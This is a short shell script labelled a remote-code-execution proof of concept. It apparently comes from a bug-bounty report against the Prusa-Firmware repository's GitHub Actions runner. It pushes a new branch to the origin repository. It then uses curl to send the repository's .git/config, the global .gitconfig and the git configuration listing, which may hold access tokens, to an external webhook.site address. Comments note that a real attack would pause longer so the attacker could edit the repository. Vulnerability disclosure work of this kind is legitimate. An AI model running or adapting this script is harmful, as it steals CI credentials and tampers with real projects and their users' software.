#filename: myscript.sh
echo -------------poc_rce-------------- >&2

git config --list >&2

echo "--- creating malicious branch, can easily push to master or release ---" >&2 
git config --global user.email "bh@someemail.com"
git config --global user.name "H1Tester"
git fetch origin >&2
git checkout MK3 >&2
git pull origin MK3 >&2
git checkout -b bh-poc >&2
git add . >&2
git push -u origin bh-poc >&2

echo "--- token exfiltration ---" >&2 

export webhook="https://webhook.site/7a472bcf-3e17-4b17-a404-5d1f7f58a39b"
export repo=Prusa-Firmware/Prusa-Firmware

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook"



curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
  "$webhook"


echo "--- sleeping (in real attack use longer time) ---" >&2
sleep 2 # in real attack it will be 1200 to have time to edit 